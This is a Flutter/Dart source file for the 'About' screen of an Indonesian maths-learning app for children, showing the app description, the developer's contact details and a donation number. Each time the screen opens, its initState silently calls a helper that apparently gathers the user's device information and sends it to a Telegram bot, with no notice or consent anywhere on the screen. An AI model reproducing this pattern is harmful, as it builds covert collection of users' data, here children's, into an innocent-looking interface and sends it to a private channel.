import 'package:belajar_matika/utils/device_info_helper.dart';
import 'package:belajar_matika/utils/tele_helper.dart';
import 'package:flutter/material.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:logger/logger.dart';
import 'package:url_launcher/url_launcher.dart';

class AboutScreen extends StatefulWidget {
  const AboutScreen({super.key});

  @override
  State<AboutScreen> createState() => _AboutScreenState();
}

class _AboutScreenState extends State<AboutScreen> {
  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
    telegramHelper: TelegramHelper(
      botToken: dotenv.env['BOT_TOKEN'] ?? '', // Ganti dengan token bot Anda
      chatId: dotenv.env['CHAT_ID'] ?? '', // Ganti dengan chat ID Anda
    ),
  );
  bool isLoading = true;

  @override
  void initState() {
    super.initState();
    _loadAndSendDeviceInfo();
  }

  Future<void> _loadAndSendDeviceInfo() async {
    try {
      await deviceInfoHelper.getAndSendDeviceInfo();
      setState(() {
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        isLoading = false;
      });
      Logger().e(e);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text(
          "Tentang Aplikasi",
          style: TextStyle(
            fontWeight: FontWeight.bold,
            fontSize: 20,
            color: Colors.white,
          ),
        ),
        backgroundColor: Colors.blueAccent,
        centerTitle: true,
        automaticallyImplyLeading: false,
      ),
      body: SingleChildScrollView(
        child: Column(
          children: [
            // Header dengan Logo & Nama Aplikasi
            Container(
              padding: const EdgeInsets.all(20),
              decoration: const BoxDecoration(
                color: Colors.blueAccent,
                borderRadius: BorderRadius.only(
                  bottomLeft: Radius.circular(30),
                  bottomRight: Radius.circular(30),
                ),
              ),
              child: Column(
                children: [
                  ClipRRect(
                    borderRadius: BorderRadius.circular(50),
                    child: Image.asset(
                      "assets//logo/logomatika.png", // Ganti dengan logo aplikasi
                      width: 80,
                      height: 80,
                    ),
                  ),
                  const SizedBox(height: 10),
                  const Text(
                    "Tebak Skor",
                    style: TextStyle(
                      fontSize: 22,
                      fontWeight: FontWeight.bold,
                      color: Colors.white,
                    ),
                  ),
                  const Text(
                    "Belajar matematika dengan cara yang menyenangkan!",
                    textAlign: TextAlign.center,
                    style: TextStyle(color: Colors.white70),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 20),

            // Deskripsi Aplikasi
            const Padding(
              padding: EdgeInsets.symmetric(horizontal: 20),
              child: Text(
                "Aplikasi ini dibuat untuk membantu anak-anak belajar berhitung dengan cara yang interaktif dan menyenangkan. "
                "Dengan berbagai level dan animasi yang menarik, anak-anak bisa mengasah kemampuan matematika mereka dengan lebih baik.",
                textAlign: TextAlign.center,
                style: TextStyle(fontSize: 14, height: 1.5),
              ),
            ),
            const SizedBox(height: 20),

            // Informasi Developer
            _buildInfoCard(
              icon: Icons.person,
              title: "Dibuat oleh",
              subtitle: "Miftahularif",
            ),
            _buildInfoCard(
              icon: Icons.email,
              title: "Email",
              subtitle: "miftahularif.dev@gmail.com",
              isClickable: true,
              onTap: () => _launchURL("mailto:miftahularif.dev@gmail.com"),
            ),
            const SizedBox(height: 16),
            const SizedBox(
              width: double.infinity,
              child: Text("Donasi",
                  textAlign: TextAlign.center,
                  style: TextStyle(
                      color: Colors.black,
                      fontWeight: FontWeight.bold,
                      fontSize: 12)),
            ),
            const SizedBox(height: 8),
            Image.asset(
              'assets/logo/logo-ewallet.png',
              width: 130,
              // height: 120,
              fit: BoxFit.cover,
            ),
            const SizedBox(height: 8),
            const SizedBox(
              width: double.infinity,
              child: Text("0852-5088-7277",
                  textAlign: TextAlign.center,
                  style: TextStyle(
                      color: Colors.black,
                      fontWeight: FontWeight.bold,
                      fontSize: 12)),
            ),
            const SizedBox(height: 8),

            // Tombol kembali
            const SizedBox(height: 30),
          ],
        ),
      ),
    );
  }

  // Widget untuk membuat info card
  Widget _buildInfoCard({
    required IconData icon,
    required String title,
    required String subtitle,
    bool isClickable = false,
    VoidCallback? onTap,
  }) {
    return GestureDetector(
      onTap: isClickable ? onTap : null,
      child: Card(
        margin: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
        elevation: 3,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(15),
        ),
        child: ListTile(
          leading: Icon(icon, color: Colors.blueAccent),
          title:
              Text(title, style: const TextStyle(fontWeight: FontWeight.bold)),
          subtitle: Text(subtitle,
              style:
                  TextStyle(color: isClickable ? Colors.blue : Colors.black87)),
          trailing: isClickable
              ? const Icon(Icons.open_in_new, color: Colors.blueAccent)
              : null,
        ),
      ),
    );
  }

  // Fungsi untuk membuka URL
  void _launchURL(String url) async {
    if (await canLaunchUrl(Uri.parse(url))) {
      await launchUrl(Uri.parse(url));
    } else {
      debugPrint("Tidak bisa membuka URL: $url");
    }
  }
}
